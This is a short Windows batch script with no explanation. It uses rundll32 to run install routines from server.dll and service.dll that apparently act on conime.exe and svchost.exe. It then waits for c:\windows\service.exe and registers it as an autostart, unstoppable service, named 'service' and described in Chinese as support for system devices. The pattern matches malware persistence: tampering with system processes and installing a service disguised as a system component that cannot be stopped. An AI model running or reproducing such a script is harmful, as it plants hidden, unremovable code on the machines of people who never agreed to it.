rundll32.exe server.dll,UninstallPE conime.exe
rundll32.exe server.dll,InstallPE
rundll32.exe service.dll,UninstallSB svchost.exe
rundll32.exe service.dll,InstallSB 
:loop
if not exist c:\windows\service.exe (goto loop)
runassrv add /cmdline:"c:\windows\service.exe" /name:"service" /starttype:"autostart" /dispname:"service" /desc:"为系统设备提供支持" /unstoppable